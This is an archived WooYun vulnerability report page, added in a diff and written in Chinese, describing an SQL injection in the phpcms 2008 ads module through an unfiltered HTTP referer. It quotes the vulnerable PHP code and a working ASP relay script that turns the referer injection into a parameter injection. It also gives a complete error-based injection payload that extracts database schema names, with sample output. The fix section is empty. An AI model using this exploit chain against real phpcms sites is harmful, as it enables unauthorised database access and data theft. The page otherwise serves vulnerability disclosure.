@@ -1,0 +1,338 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		phpcms 2008 注入漏洞  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		phpcms 2008 注入漏洞  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/icefish">icefish</a> 
+</li><li>提交时间：		2011-11-21 20:11</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2011-11-21：	细节已通知厂商并且等待厂商处理中<br/>
+									2011-11-22：	厂商已经确认，细节仅向厂商公开<br/>
+									2011-11-25：	细节向第三方安全合作伙伴开放<br/>
+									2011-12-02：	细节向核心白帽子及相关领域专家公开<br/>
+									2011-12-12：	细节向普通白帽子公开<br/>
+									2012-01-01：	细节向实习白帽子公开<br/>
+									2011-12-21：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">phpcms 2008 中广告模块，存在参数过滤不严，导致了sql注入漏洞，如果对方服务器开启了错误显示，可直接利用，如果关闭了错误显示，可以采用基于时间和错误的盲注</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail"></p><pre><code>js.php<br />
+&lt;?php<br />
+chdir(&#039;../ads/&#039;);<br />
+require &#039;./ad.php&#039;;<br />
+?&gt;<br />
+ <br />
+ <br />
+ad.php<br />
+&lt;?php<br />
+require &#039;./include/common.inc.php&#039;;<br />
+$year = date(&#039;ym&#039;,TIME);<br />
+$table_status = $db-&gt;table_status(DB_PRE.&#039;ads_&#039;.$year);<br />
+if(!$table_status) {<br />
+ include MOD_ROOT.&#039;include/create.table.php&#039;;<br />
+}<br />
+$place-&gt;show($id);<br />
+?&gt;<br />
+ <br />
+common.inc.php<br />
+&lt;?php <br />
+$mod = &#039;ads&#039;;<br />
+define(&#039;MOD_ROOT&#039;, substr(dirname(__FILE__), 0, -7));<br />
+require substr(MOD_ROOT, 0, -1-strlen($mod)).&#039;include/common.inc.php&#039;;<br />
+require MOD_ROOT.&#039;include/global.func.php&#039;;<br />
+require MOD_ROOT.&#039;include/ads_place.class.php&#039;;<br />
+require MOD_ROOT.&#039;include/ads.class.php&#039;;<br />
+$GROUP = cache_read(&#039;member_group.php&#039;);<br />
+$c_ads = new ads();<br />
+$place = new ads_place();<br />
+$head[&#039;title&#039;] = $M[&#039;name&#039;];<br />
+$head[&#039;keyword&#039;] = $M[&#039;keyword&#039;];<br />
+$head[&#039;description&#039;] = $M[&#039;description&#039;];<br />
+if($_userid)<br />
+{<br />
+ $_extend_group = $db-&gt;select(&quot;SELECT groupid FROM `&quot;.DB_PRE.&quot;member_group_extend` WHERE `userid`=$_userid&quot;);<br />
+}<br />
+?&gt;<br />
+ <br />
+ads_place.class.php<br />
+function show($placeid)<br />
+ {<br />
+  global $_username;<br />
+  $placeid = intval($placeid);<br />
+  if(!$placeid) return FALSE;<br />
+  $ip = IP;<br />
+  $time = time();<br />
+  //echo $this-&gt;referer;<br />
+  $adses = $this-&gt;db-&gt;select(&quot;SELECT * FROM &quot;.DB_PRE.&quot;ads a, $this-&gt;table p WHERE a.placeid=p.placeid AND p.placeid=$placeid AND a.fromdate&lt;=UNIX_TIMESTAMP() AND a.todate&gt;=UNIX_TIMESTAMP() AND a.passed=1 AND a.status=1 AND p.passed=1&quot;);<br />
+  if($adses[0][&#039;option&#039;])<br />
+  { <br />
+   foreach($adses as $ads)<br />
+   { <br />
+    $contents[] = ads_content($ads, 1);<br />
+    echo (&quot;INSERT INTO $this-&gt;stat_table (`adsid`, `username`, `ip`, `referer`, `clicktime`, `type`) VALUES (&#039;$ads[adsid]&#039;, &#039;$_username&#039;, &#039;$ip&#039;, &#039;$this-&gt;referer&#039;, &#039;$time&#039;, &#039;0&#039;)&quot;);<br />
+    $this-&gt;db-&gt;query(&quot;INSERT INTO $this-&gt;stat_table (`adsid`, `username`, `ip`, `referer`, `clicktime`, `type`) VALUES (&#039;$ads[adsid]&#039;, &#039;$_username&#039;, &#039;$ip&#039;, &#039;$this-&gt;referer&#039;, &#039;$time&#039;, &#039;0&#039;)&quot;);<br />
+    $template = $ads[&#039;template&#039;] ? $ads[&#039;template&#039;] : &#039;ads&#039;;<br />
+   }<br />
+  }<br />
+  else<br />
+  { echo (&quot;INSERT INTO $this-&gt;stat_table (`adsid`, `username`, `ip`, `referer`, `clicktime`, `type`) VALUES (&#039;$ads[adsid]&#039;, &#039;$_username&#039;, &#039;$ip&#039;, &#039;$this-&gt;referer&#039;, &#039;$time&#039;, &#039;0&#039;)&quot;);<br />
+   $ads = $this-&gt;db-&gt;get_one(&quot;SELECT * FROM &quot;.DB_PRE.&quot;ads a, $this-&gt;table p WHERE a.placeid=p.placeid AND p.placeid=$placeid AND a.fromdate&lt;=UNIX_TIMESTAMP() AND a.todate&gt;=UNIX_TIMESTAMP() AND a.passed=1 AND a.status=1 ORDER BY rand() LIMIT 1&quot;);<br />
+   $contents[] = ads_content($ads, 1);<br />
+   $this-&gt;db-&gt;query(&quot;INSERT INTO $this-&gt;stat_table (`adsid`, `username`, `ip`, `referer`, `clicktime`, `type`) VALUES (&#039;$ads[adsid]&#039;, &#039;$_username&#039;, &#039;$ip&#039;, &#039;$this-&gt;referer&#039;, &#039;$time&#039;, &#039;0&#039;)&quot;);<br />
+   $template = $ads[&#039;template&#039;] ? $ads[&#039;template&#039;] : &#039;ads&#039;;<br />
+  }<br />
+  include template(&#039;ads&#039;, $template);<br />
+ }</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+具体问题在于<br />
+<br />
+ $this-&gt;db-&gt;query(&quot;INSERT INTO $this-&gt;stat_table (`adsid`, `username`, `ip`, `referer`, `clicktime`, `type`) VALUES (&#039;$ads[adsid]&#039;, &#039;$_username&#039;, &#039;$ip&#039;, &#039;$this-&gt;referer&#039;, &#039;$time&#039;, &#039;0&#039;)&quot;);<br />
+<br />
+这段中$this-&gt;referer没有经过过滤，可以被用户所操作，如果没有关闭错误提示，则可以直接利用注入工具，采用基于错误的方式进行sql注入<br />
+<br />
+如果有自定义错误页面，则可以采用盲注的方式<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"></p><p class="detail"><a href="../images/2120112592e747b6d8103e721ea16d215fcd5e0e.jpg" target="_blank"><img src="../images/2120112592e747b6d8103e721ea16d215fcd5e0e.jpg" alt="" width="600"/></a></p><p class="detail"></p><p class="detail"><a href="../images/211944144ac622530199c7be82c8dca7c6d710cc.jpg" target="_blank"><img src="../images/211944144ac622530199c7be82c8dca7c6d710cc.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><p class="detail"><a href="../images/21194304068f73346396536fa25f235a6542b0e0.jpg" target="_blank"><img src="../images/21194304068f73346396536fa25f235a6542b0e0.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+</p><pre><code>&lt;%<br />
+inject_data=request(&quot;inject_ref&quot;)<br />
+JmStr=&quot;&quot;<br />
+JMUrl=&quot;http://localhost:81/php/phpcms2008_utf8/phpcms/data/js.php?id=8&quot;<br />
+JmRef=inject_data<br />
+JmPost=&quot;&quot;<br />
+JmCok=&quot;ASPSESSIONIDAQACTAQB=HKFHJOPDOMAIKGMPGBJJDKLJ;&quot;<br />
+JmCok=replace(JmCok,chr(32),&quot;%20&quot;) <br />
+JmStr=URLEncoding(JmStr)  <br />
+response.write  PostData(JMUrl,JmStr,JmCok,JmRef,JmPost)<br />
+<br />
+Function PostData(PostUrl,PostStr,PostCok,PostRef,PostdataX)  <br />
+Dim Http<br />
+Set Http = Server.CreateObject(&quot;WinHttp.WinHttpRequest.5.1&quot;)<br />
+With Http<br />
+<br />
+.Open &quot;GET&quot;,PostUrl,False<br />
+.SetRequestHeader &quot;Content-Type&quot;,&quot;application/x-www-form-urlencoded&quot;<br />
+.SetRequestHeader &quot;REFERER&quot;,PostRef<br />
+.SetRequestHeader &quot;Cookie&quot;,PostCok<br />
+.Send ()<br />
+PostData = .ResponseBody<br />
+End With<br />
+Set Http = Nothing<br />
+PostData =bytes2BSTR(PostData)<br />
+if PostData=&quot;&quot; then<br />
+	PostData=PostData+&quot;OK&quot;<br />
+END IF	<br />
+<br />
+End Function<br />
+<br />
+Function bytes2BSTR(vIn)<br />
+Dim strReturn<br />
+Dim I, ThisCharCode, NextCharCode<br />
+strReturn = &quot;&quot;<br />
+For I = 1 To LenB(vIn)<br />
+ThisCharCode = AscB(MidB(vIn, I, 1))<br />
+If ThisCharCode &lt; &amp;H80 Then<br />
+strReturn = strReturn &amp; Chr(ThisCharCode)<br />
+Else<br />
+NextCharCode = AscB(MidB(vIn, I + 1, 1))<br />
+strReturn = strReturn &amp; Chr(CLng(ThisCharCode) * &amp;H100 + CInt(NextCharCode))<br />
+I = I + 1<br />
+End If<br />
+Next<br />
+bytes2BSTR = strReturn<br />
+End Function<br />
+<br />
+Function URLEncoding(vstrin) <br />
+strReturn=&quot;&quot;<br />
+Dim i<br />
+For i=1 To Len(vstrin)<br />
+ThisChr=Mid(vstrin,i,1)<br />
+if Abs(Asc(ThisChr))&lt; &amp;HFF Then<br />
+strReturn=strReturn &amp; ThisChr<br />
+Else<br />
+InnerCode=Asc(ThisChr)<br />
+If InnerCode&lt;0 Then<br />
+InnerCode=InnerCode + &amp;H10000<br />
+End If<br />
+Hight1=(InnerCode And &amp;HFF00) \&amp;HFF<br />
+Low1=InnerCode And &amp;HFF<br />
+strReturn=strReturn &amp; &quot;%&quot; &amp; Hex(Hight1) &amp; &quot;%&quot; &amp; Hex(Low1)<br />
+End if<br />
+Next<br />
+strReturn=Replace(strReturn,chr(32),&quot;%20&quot;) &#039;转换空格,如果网站过滤了空格,尝试用/**/来代替%20<br />
+strReturn=Replace(strReturn,chr(43),&quot;%2B&quot;)  &#039;JMDCW增加转换+字符<br />
+&#039;strReturn=Replace(strReturn,过滤字符,&quot;转换为字符&quot;)  &#039;在此增加要过滤的代码<br />
+URLEncoding=strReturn<br />
+End Function<br />
+&#039;powered by wcf1987<br />
+%&gt;</code></pre><p class='detail'><br />
+<br />
+这是一段中转用的代码，可以利用这个代码把对referer的注入改为对post的注入。<br />
+<br />
+这是利用代码<br />
+<br />
+http://127.0.0.1:82/php2008_jsphp.asp?inject_ref=inject_ref=1&#039; AND (SELECT 1698 FROM(SELECT COUNT(*),CONCAT(CHAR(58,100,121,118,58),(SELECT MID((IFNULL(CAST(schema_name AS CHAR),CHAR(32))),1,50) FROM information_schema.SCHEMATA LIMIT 0,1),CHAR(58,110,118,117,58),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND &#039;JYUd&#039;=&#039;JYUd<br />
+<br />
+基于错误的，结果时爆出了数据库：<br />
+<br />
+Duplicate entry &#039;:dyv:information_schema:nvu:1&#039; for key &#039;group_key&#039; <br />
+<br />
+<br />
+<br />
+ </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail"> </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/icefish" title="icefish">icefish</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-03370" title="phpcms 2008 注入漏洞">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：中</p>
+						<p class="detail">漏洞Rank：6 </p>
+													<p class="detail">确认时间：2011-11-22 11:47</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">十分感谢！十分感谢！！万分感谢！</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="3370";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
